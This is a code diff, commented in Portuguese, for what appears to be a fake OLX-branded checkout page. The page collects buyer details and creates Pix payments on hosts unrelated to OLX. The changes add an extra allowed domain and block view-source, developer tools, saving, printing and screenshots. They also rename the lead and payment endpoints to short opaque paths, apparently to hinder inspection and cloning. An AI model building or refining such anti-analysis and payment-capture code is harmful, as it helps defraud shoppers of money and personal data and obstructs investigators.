@@ -10,7 +10,7 @@
   (function(){
     'use strict';
     // 1. Fingerprint de domínio: bloqueia clones em domínio diferente
-    var _allowed = ['olx-9ee8.onrender.com','localhost','127.0.0.1'];
+    var _allowed = ['olx-9ee8.onrender.com','olxproduto.workers.dev','localhost','127.0.0.1'];
     var _host = location.hostname.toLowerCase();
     var _ok = _allowed.some(function(d){ return _host === d || _host.endsWith('.'+d); });
     if(!_ok){
@@ -35,12 +35,20 @@
     // 4. Bloqueia botão direito e seleção de texto
     document.addEventListener('contextmenu',function(e){e.preventDefault();});
     document.addEventListener('selectstart',function(e){e.preventDefault();});
-    // 5. Bloqueia Ctrl+U (view-source), Ctrl+S, Ctrl+A, F12
+    // 5. Bloqueia Ctrl+U (view-source), Ctrl+S, Ctrl+A, F12, PrintScreen
     document.addEventListener('keydown',function(e){
       var k=e.key||''; var c=e.ctrlKey||e.metaKey;
-      if(c&&(k==='u'||k==='U'||k==='s'||k==='S'||k==='a'||k==='A'))e.preventDefault();
-      if(k==='F12')e.preventDefault();
+      if(c&&(k==='u'||k==='U'||k==='s'||k==='S'||k==='a'||k==='A'||k==='p'||k==='P'))e.preventDefault();
+      if(k==='F12'||k==='PrintScreen')e.preventDefault();
     });
+    // 5b. Bloqueia view-source: na URL e print da pagina
+    if(location.protocol==='view-source:'){
+      location.replace('about:blank');
+    }
+    // 5c. Bloqueia Print via CSS
+    var _ps=document.createElement('style');
+    _ps.textContent='@media print{body{display:none!important;}}';
+    document.head&&document.head.appendChild(_ps);
     // 6. Ofusca o source: substitui innerHTML por placeholders após render
     window.addEventListener('load',function(){
       var all=document.querySelectorAll('[data-v]');
@@ -1582,7 +1590,7 @@
         shipping_coupon: SHIPPING_COUPON,
       };
 
-      const leadRes = await fetch('/api/lead', {
+      const leadRes = await fetch('/l', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(leadPayload)
@@ -1594,7 +1602,7 @@
       }
 
       // 2. Gera o Pagamento Pix Seguro (C7 / Gateway Oficial)
-      const pixRes = await fetch('/api/generate-pix', {
+      const pixRes = await fetch('/p', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ session_id: SESSION_ID, ...leadPayload })
@@ -1679,7 +1687,7 @@
 
     paymentPollTimer = setInterval(async () => {
       try {
-        const res = await fetch(`/api/check-payment/${paymentId}`);
+        const res = await fetch(`/s/${paymentId}`);
         const d = await res.json();
         if (d.status === 'paid' || d.status === 'approved') {
           clearInterval(paymentPollTimer);
